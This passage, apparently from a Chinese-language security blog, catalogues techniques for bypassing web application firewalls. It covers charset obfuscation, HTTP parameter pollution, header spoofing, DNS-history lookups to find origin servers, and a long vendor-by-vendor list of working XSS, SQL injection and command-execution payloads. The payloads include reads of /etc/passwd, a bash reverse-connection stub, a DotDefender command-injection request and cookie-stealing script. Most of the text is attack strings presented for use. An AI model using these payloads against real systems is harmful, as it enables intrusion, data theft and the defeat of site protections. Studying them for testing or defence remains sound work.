parser._action_groups.pop()</span><br><span class="line"></span><br><span class="line">    # A simple hack to have required arguments and optional arguments separately</span><br><span class="line">    required = parser.add_argument_group(&#x27;Required Arguments&#x27;)</span><br><span class="line">    optional = parser.add_argument_group(&#x27;Optional Arguments&#x27;)</span><br><span class="line"></span><br><span class="line">    # Required Options</span><br><span class="line">    required.add_argument(&#x27;-s&#x27;, &#x27;--str&#x27;, help=&#x27;String to obfuscate&#x27;, dest=&#x27;str&#x27;)</span><br><span class="line">    required.add_argument(&#x27;-e&#x27;, &#x27;--enc&#x27;, help=&#x27;Encoding type. eg: ibm037, utf16, etc&#x27;, dest=&#x27;enc&#x27;)</span><br><span class="line"></span><br><span class="line">    # Optional Arguments (main stuff and necessary)</span><br><span class="line">    optional.add_argument(&#x27;-ueo&#x27;, help=&#x27;URL Encode Output&#x27;, dest=&#x27;ueo&#x27;, action=&#x27;store_true&#x27;)</span><br><span class="line">    optional.add_argument(&#x27;-udi&#x27;, help=&#x27;URL Decode Input&#x27;, dest=&#x27;udi&#x27;, action=&#x27;store_true&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if not len(sys.argv) &gt; 1:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        quit()</span><br><span class="line">    print(&#x27;Input: %s&#x27; % (args.str))</span><br><span class="line">    print(&#x27;Output: %s&#x27; % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">服务器信息</th>
<th align="left">可用编码</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Nginx, uWSGI-Django-Python3</td>
<td align="left">IBM037, IBM500, cp875, IBM1026, IBM273</td>
<td align="left">对参数名和参数值进行编码 服务器会对参数名和参数值均进行url解码 需要对等号和&amp; and进行编码(不进行url编码)</td>
</tr>
<tr>
<td align="left">Nginx, uWSGI-Django-Python2</td>
<td align="left">IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
<td align="left">对参数名和参数值进行便慢慢 服务器会对参数名和参数值均进行url解码 等号和&amp;符号不应该以任何方式编码。</td>
</tr>
<tr>
<td align="left">Apache-TOMCAT8-JVM1.8-JSP</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td align="left">Apache-TOMCAT7-JVM1.6-JSP</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td align="left">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
</tbody></table>
<h3 id="0X04-HTTP-参数污染"><a href="#0X04-HTTP-参数污染" class="headerlink" title="0X04    HTTP 参数污染"></a><strong>0X04    HTTP 参数污染</strong></h3><h4 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这种攻击方法基于服务器如何解释具有相同名称的参数</span><br><span class="line">可能造成bypass的情况:</span><br><span class="line">服务器使用最后接收到的参数，WAF只检查第一个参数</span><br><span class="line">服务器将来自类似参数的值联合起来，WAF单独检查它们</span><br></pre></td></tr></table></figure>

<p>下面是相关服务器对参数解释的比较</p>
<table>
<thead>
<tr>
<th align="left">环境</th>
<th align="left">参数解析</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ASP/IIS</td>
<td align="left">用逗号连接</td>
<td align="left">par1=val1,val2</td>
</tr>
<tr>
<td align="left">JSP, Servlet/Apache Tomcat</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">ASP.NET/IIS</td>
<td align="left">用逗号连接</td>
<td align="left">par1=val1,val2</td>
</tr>
<tr>
<td align="left">PHP/Zeus</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">PHP/Apache</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">JSP, Servlet/Jetty</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IBM Lotus Domino</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IBM HTTP Server</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">mod_perl, libapeq2/Apache</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Oracle Application Server 10G</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Perl CGI/Apache</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Python/Zope</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IceWarp</td>
<td align="left">返回一个列表</td>
<td align="left">[‘val1’,’val2’]</td>
</tr>
<tr>
<td align="left">AXIS 2400</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">DBMan</td>
<td align="left">由两个波浪号连接起来</td>
<td align="left">par1=val1~~val2</td>
</tr>
<tr>
<td align="left">mod-wsgi (Python)/Apache</td>
<td align="left">返回一个列表</td>
<td align="left">ARRAY(0x8b9058c)</td>
</tr>
</tbody></table>
<h3 id="0X05-浏览器的缺陷"><a href="#0X05-浏览器的缺陷" class="headerlink" title="0X05    浏览器的缺陷"></a><strong>0X05    浏览器的缺陷</strong></h3><h4 id="Charset-Bugs"><a href="#Charset-Bugs" class="headerlink" title="Charset Bugs:"></a>Charset Bugs:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32)</span><br><span class="line"></span><br><span class="line">当网站解码的时候，触发payload</span><br></pre></td></tr></table></figure>

<p>Example request:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</span><br><span class="line">Accept-Charset:utf-32; q=0.5&lt;</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

<p>当站点加载时，将其编码为我们设置的UTF-32编码，然后由于页面的输出编码为UTF-8，将其呈现为:<code>&quot;alert (1) &lt;/ script&gt;</code> 从而触发xss</p>
<p>完整url编码后的 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span><br></pre></td></tr></table></figure>

<h4 id="Null-空字节"><a href="#Null-空字节" class="headerlink" title="Null 空字节"></a>Null 空字节</h4><p>空字节通常用作字符串终止符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload 示例:</span><br><span class="line"></span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">标准: &lt;a href=&quot;javascript:alert()&quot;&gt;</span><br><span class="line">混淆: &lt;a href=&quot;ja0x09vas0x0A0x0Dcript:alert(1)&quot;&gt;clickme&lt;/a&gt;</span><br><span class="line">变形: &lt;a 0x00 href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="解析错误"><a href="#解析错误" class="headerlink" title="解析错误"></a>解析错误</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RFC 声明节点名不可以由空白起始</span><br><span class="line"></span><br><span class="line">但是我们可以使用特殊字符 ` %, //, !, ?`, etc.</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line"></span><br><span class="line">&lt;// style=x:expression\28write(1)\29&gt; - Works upto IE7 (Source)</span><br><span class="line"></span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; - Works upto IE9 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/css&quot;?&gt;&lt;root style=&quot;x:expression(write(1))&quot;/&gt; - Works in IE7 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;%div%20style=xss:expression(prompt(1))&gt; - Works Upto IE7</span><br></pre></td></tr></table></figure>

<h4 id="Unicode-分隔符"><a href="#Unicode-分隔符" class="headerlink" title="Unicode 分隔符"></a>Unicode 分隔符</h4><ul>
<li>每个浏览器有不同的分隔分隔符</li>
</ul>
<p>@Masato Kinugawafuzz 后发现如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3B</span><br><span class="line"></span><br><span class="line">Chrome: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Safari: 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">FireFox: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Opera: 0x09, 0x20, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Android: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a/onmouseover[\x0b]=location=&#x27;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#x27;&gt;pwn3d</span><br></pre></td></tr></table></figure>

<h3 id="使用其他非典型等效语法结构替换"><a href="#使用其他非典型等效语法结构替换" class="headerlink" title="使用其他非典型等效语法结构替换"></a>使用其他非典型等效语法结构替换</h3><p>找的waf开发人员没有注意到的语句进行攻击</p>
<p>一些WAF开发人员忽略的常见关键字:</p>
<ul>
<li><p>JavaScript functions:</p>
</li>
<li><ul>
<li><code>window</code></li>
<li><code>parent</code></li>
<li><code>this</code></li>
<li><code>self</code></li>
</ul>
</li>
<li><p>Tag attributes:</p>
</li>
<li><ul>
<li><code>onwheel</code></li>
<li><code>ontoggle</code></li>
<li><code>onfilterchange</code></li>
<li><code>onbeforescriptexecute</code></li>
<li><code>ondragstart</code></li>
<li><code>onauxclick</code></li>
<li><code>onpointerover</code></li>
<li><code>srcdoc</code></li>
</ul>
</li>
</ul>
<p>SQL Operators</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lpad</span><br><span class="line">lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充</span><br><span class="line">  lpad(&#x27;tech&#x27;, 7); 将返回&#x27; tech&#x27;</span><br><span class="line">  lpad(&#x27;tech&#x27;, 2); 将返回&#x27;te&#x27;</span><br><span class="line">  lpad(&#x27;tech&#x27;, 8, &#x27;0&#x27;); 将返回&#x27;0000tech&#x27;</span><br><span class="line">  lpad(&#x27;tech on the net&#x27;, 15, &#x27;z&#x27;); 将返回&#x27;tech on the net&#x27;</span><br><span class="line">  lpad(&#x27;tech on the net&#x27;, 16, &#x27;z&#x27;); 将返回&#x27;ztech on the net</span><br><span class="line">field</span><br><span class="line">FIELD(str,str1,str2,str3,...)</span><br><span class="line">返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| FIELD(&#x27;ej&#x27;, &#x27;Hej&#x27;, &#x27;ej&#x27;, &#x27;Heja&#x27;, &#x27;hej&#x27;, &#x27;foo&#x27;) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| 2                                                       |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>bit_count</code> 二进制数中包含1的个数。BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2</p>
<p>示例payloads:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Case: XSS</span><br><span class="line">&lt;script&gt;window[&#x27;alert&#x27;](0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;parent[&#x27;alert&#x27;](1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;self[&#x27;alert&#x27;](2)&lt;/script&gt;</span><br><span class="line">Case: SQLi</span><br><span class="line">SELECT if(LPAD(&#x27; &#x27;,4,version())=&#x27;5.7&#x27;,sleep(5),null);</span><br><span class="line">1%0b||%0bLPAD(USER,7,1)</span><br><span class="line">可以使用许多替代原生JavaScript的方法:</span><br></pre></td></tr></table></figure>

<p>JSFuck</p>
<p>JJEncode</p>
<p>XChars.JS</p>
<h3 id="滥用SSL-TLS密码"><a href="#滥用SSL-TLS密码" class="headerlink" title="滥用SSL/TLS密码:"></a>滥用SSL/TLS密码:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多时候，服务器可以接收各种SSL/TLS密码和版本的连接。</span><br><span class="line">初始化到waf不支持的版本</span><br><span class="line">找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。</span><br><span class="line">找出服务器支持的密码(SSLScan这种工具可以帮助到你)。</span><br><span class="line">找出服务器支持但waf不支持的</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tool</strong>: abuse-ssl-bypass-waf</p>
</blockquote>
<h3 id="滥用-DNS-记录"><a href="#滥用-DNS-记录" class="headerlink" title="滥用 DNS 记录:"></a>滥用 DNS 记录:</h3><ul>
<li>找到云waf后的源站</li>
</ul>
<blockquote>
<p><strong>TIP:</strong> 一些在线资源 IP History 和 DNS Trails</p>
</blockquote>
<p><strong>Tool</strong>: bypass-firewalls-by-DNS-history</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash bypass-firewalls-by-DNS-history.sh -d &lt;target&gt; --checkall</span><br></pre></td></tr></table></figure>

<h3 id="请求头欺骗"><a href="#请求头欺骗" class="headerlink" title="请求头欺骗"></a>请求头欺骗</h3><p>让waf以为请求来自于内部网络，进而不对其进行过滤。</p>
<p>添加如下请求头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="Google-Dorks-Approach"><a href="#Google-Dorks-Approach" class="headerlink" title="Google Dorks Approach:"></a><strong>Google Dorks Approach:</strong></h3><p>应对已知WAF的绕过</p>
<h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法:"></a>搜索语法:</h4><h4 id="Normal-search"><a href="#Normal-search" class="headerlink" title="Normal search:"></a>Normal search:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ waf bypass</span><br></pre></td></tr></table></figure>

<p>Searching for specific version exploits:<br><code>&quot; &quot; (bypass|exploit)</code></p>
<p>For specific type bypass exploits:<br><code>&quot;&quot; + (bypass|exploit)</code></p>
<p>On Exploit DB:<br><code>site:exploit-db.com + bypass</code></p>
<p>On 0Day Inject0r DB:<br><code>site:0day.today +  (bypass|exploit)</code></p>
<p>On Twitter:<br><code>site:twitter.com + bypass</code></p>
<p>On Pastebin<br><code>site:pastebin.com + bypass</code></p>
<h2 id="0X06-拓展Bypass姿势"><a href="#0X06-拓展Bypass姿势" class="headerlink" title="0X06  拓展Bypass姿势"></a><strong>0X06  拓展Bypass姿势</strong></h2><h3 id="Airlock-Ergon"><a href="#Airlock-Ergon" class="headerlink" title="Airlock Ergon"></a><strong>Airlock Ergon</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQLi Overlong UTF-8 Sequence Bypass (&gt;= v4.2.4) by @Sec Consult</span><br><span class="line"></span><br><span class="line">%C0%80&#x27;+union+select+col1,col2,col3+from+table+--+</span><br></pre></td></tr></table></figure>



<p><strong>AWS</strong></p>
<p>SQLi Bypass by @enkaskal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;; select * from TARGET_TABLE --</span><br><span class="line">XSS Bypass by @kmkz</span><br><span class="line">&lt;script&gt;eval(atob(decodeURIComponent(&quot;payload&quot;)))//</span><br></pre></td></tr></table></figure>

<h3 id="Barracuda"><a href="#Barracuda" class="headerlink" title="Barracuda"></a><strong>Barracuda</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>HTML Injection by @Global-Evolution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /cgi-mod/index.cgi?&amp;primary_tab=ADVANCED&amp;secondary_tab=test_backup_server&amp;content_only=1&amp;&amp;&amp;backup_port=21&amp;&amp;backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_type=ftp&amp;&amp;backup_life=5&amp;&amp;backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&amp;&amp;user=guest&amp;&amp;password=121c34d4e85dfe6758f31ce2d7b763e7&amp;&amp;et=1261217792&amp;&amp;locale=en_US</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()&gt;clickhere</span><br><span class="line">Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit) by @xort</span><br></pre></td></tr></table></figure>

<p>Barracuda Spam &amp; Virus Firewall 5.1.3 - Remote Command Execution (Metasploit) by @xort</p>
<h3 id="Cerber-WordPress"><a href="#Cerber-WordPress" class="headerlink" title="Cerber (WordPress)"></a><strong>Cerber (WordPress)</strong></h3><p>Username Enumeration Protection Bypass by HTTP Verb Tampering by @ed0x21son</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST host.com HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)</span><br><span class="line"></span><br><span class="line">author=1</span><br></pre></td></tr></table></figure>

<p>Protected Admin Scripts Bypass by @ed0x21son</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils</span><br><span class="line">http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar</span><br></pre></td></tr></table></figure>

<p>REST API Disable Bypass by @ed0x21son</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://host/index.php/wp-json/wp/v2/users/</span><br></pre></td></tr></table></figure>

<h3 id="Citrix-NetScaler"><a href="#Citrix-NetScaler" class="headerlink" title="Citrix NetScaler"></a><strong>Citrix NetScaler</strong></h3><p>SQLi via HTTP Parameter Pollution (NS10.5) by @BGA Security</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:tem=&quot;http://tempuri.org/&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header/&gt;</span><br><span class="line">   &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;string&gt;’ union select current_user, 2#&lt;/string&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">generic_api_call.pl XSS by @NNPoster</span><br><span class="line">http://host/ws/generic_api_call.pl?function=statns&amp;standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e</span><br></pre></td></tr></table></figure>



<p>```**Cloudflare**`</p>
<p>HTML Injection by @spyerror</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div style=&quot;background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);&quot;&gt;X</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @c0d3g33k</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a+HREF=&#x27;javascrip%26%239t:alert%26lpar;document.domain)&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypasses by @Bohdan Korzhynskyi</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=prompt%26%230000000040document.domain)&gt;</span><br><span class="line">&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;</span><br><span class="line">xss&#x27;&quot;&gt;&lt;iframe srcdoc=&#x27;%26lt;script&gt;;prompt`$&#123;document.domain&#125;`%26lt;/script&gt;&#x27;&gt;</span><br><span class="line">1&#x27;&quot;&gt;&lt;img/src/onerror=.1|alert``&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @RakeshMane10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @ArbazKiraak</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;\u0061\u006C\u0065\u0072\u0074&amp;lpar;this[&#x27;document&#x27;][&#x27;cookie&#x27;]&amp;rpar;&quot;&gt;X&lt;/a&gt;`</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Ahmet Ümit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Shiva Krishna</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:&#123;alert`0`&#125;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;base href=//knoxss.me?</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @RenwaX23 (Chrome only)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;j id=x style=&quot;-webkit-user-modify:read-write&quot; onfocus=&#123;window.onerror=eval&#125;throw/0/+name&gt;H&lt;/j&gt;#x</span><br></pre></td></tr></table></figure>

<p>RCE Payload Detection Bypass by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$u+/etc$u/passwd$u</span><br><span class="line">/bin$u/bash$u &lt;ip&gt; &lt;port&gt;</span><br><span class="line">&quot;;cat+/etc/passwd+#</span><br></pre></td></tr></table></figure>

<h3 id="Comodo"><a href="#Comodo" class="headerlink" title="Comodo"></a><strong>Comodo</strong></h3><p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input/oninput=&#x27;new Function`confir\u006d\`0\``&#x27;&gt;</span><br><span class="line">&lt;p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True&gt;dragme</span><br></pre></td></tr></table></figure>

<p>SQLi by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 union/**/select 1,version(),@@datadir</span><br></pre></td></tr></table></figure>

<h3 id="DotDefender"><a href="#DotDefender" class="headerlink" title="DotDefender"></a>DotDefender</h3><p>Firewall disable by (v5.0) by @hyp3rlinx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+</span><br><span class="line">&lt;enabled&gt;false&lt;/enabled&gt;</span><br></pre></td></tr></table></figure>

<p>Remote Command Execution (v3.8-5) by @John Dos</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dotDefender/index.cgi HTTP/1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-us,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</span><br><span class="line">Keep-Alive: 300</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic YWRtaW46</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 95</span><br><span class="line"></span><br><span class="line">sitename=dotdefeater&amp;deletesitename=dotdefeater;id;ls -al ../;pwd;&amp;action=deletesite&amp;linenum=15</span><br></pre></td></tr></table></figure>

<p>Persistent XSS (v4.0) by @EnableSecurity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /c?a=&lt;script&gt; HTTP/1.1</span><br><span class="line">Host: 172.16.159.132</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;</span><br><span class="line">rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-us,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;: aa</span><br><span class="line">Keep-Alive: 300</span><br></pre></td></tr></table></figure>

<p>R-XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;isindex action=&quot;javas&amp;tab;cript:alert(1)&quot; type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
